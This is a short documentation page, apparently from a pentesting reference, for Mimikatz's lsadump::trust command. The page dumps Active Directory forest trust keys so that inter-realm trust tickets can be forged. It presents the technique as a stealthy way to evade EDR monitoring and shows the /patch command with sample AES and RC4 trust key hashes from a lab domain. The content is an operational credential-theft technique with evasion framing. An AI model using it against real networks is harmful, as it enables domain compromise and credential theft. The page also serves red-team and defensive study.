# trust

It can be used for dumping the forest trust keys. Forest trust keys can be leveraged for forging inter-realm trust tickets. Since most of the EDRs are paying attention to the KRBTGT hash, this is a stealthy way to compromise forest trusts.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [privilege::debug](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # lsadump::trust /patch

Current domain: CORP.LAB.LOCAL (corp / S-1-5-21-1874506631-3219952063-538504511)

Domain: EXTERNAL.LOCAL (external / S-1-5-21-280534878-1496970234-700767426)
 [  In ] CORP.LAB.LOCAL -> EXTERNAL.LOCAL
        * aes256_hmac       6994cc6cd1b99bd3869685d14af347e955e9e043f2116ca1665f371efe48fab6
        * aes128_hmac       feeeb865b37c281b21cfa00aee1da71b
        * rc4_hmac_nt       6f9e27669d07b6c7f539c5f6e7fd9f57

 [ Out ] EXTERNAL.LOCAL -> CORP.LAB.LOCAL
        * aes256_hmac       f3417d40bb3e6f2c585e0cb00cf36444b6ebf293407103ca25d8b0650219d82d
        * aes128_hmac       8687ec2ba8ec3e8d8c6e89e94b87792c
        * rc4_hmac_nt       d3b3645b2c8efd19794dfae2dfa6946e

 [ In-1] CORP.LAB.LOCAL -> EXTERNAL.LOCAL
        * aes256_hmac       cec1143242386747b41ea21b071bfa2b211c184699c57cc69bd3f43da57bfef6
        * aes128_hmac       8668ebdcb5b9349b6c279ca9cd421a60
        * rc4_hmac_nt       4a49505568b59490b41724ce676978e5

 [Out-1] EXTERNAL.LOCAL -> CORP.LAB.LOCAL
        * aes256_hmac       9304fef5575424542d1c6cdda1920927cb55df8c203079b51e4e2cfc1cab0d4b
        * aes128_hmac       4cc55daa23d585257ab877914ea42968
        * rc4_hmac_nt       a2639f30fa151b45696631b80f57f4e6
```
